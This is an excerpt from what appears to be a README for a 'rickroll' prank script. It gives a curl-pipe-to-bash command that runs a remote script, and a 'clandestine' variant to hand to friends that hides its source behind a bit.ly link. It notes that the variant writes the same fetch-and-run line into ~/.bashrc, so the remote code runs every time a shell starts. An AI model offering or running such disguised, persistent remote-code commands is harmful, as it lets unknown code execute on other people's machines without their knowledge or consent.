...
To start rickrollin’ immediately:
    ...
    curl -s -L https://raw.githubusercontent.com/ManOfDiamond/rickrollrc/master/roll.sh | bash

Here is the clandestine command you can give to your friends 😈

    curl -s -L https://bit.ly/3K17jCM | bash
...
Which essentially just does:
    ...
    echo "curl -s -L https://bit.ly/3K17jCM | bash" >> ~/.bashrc
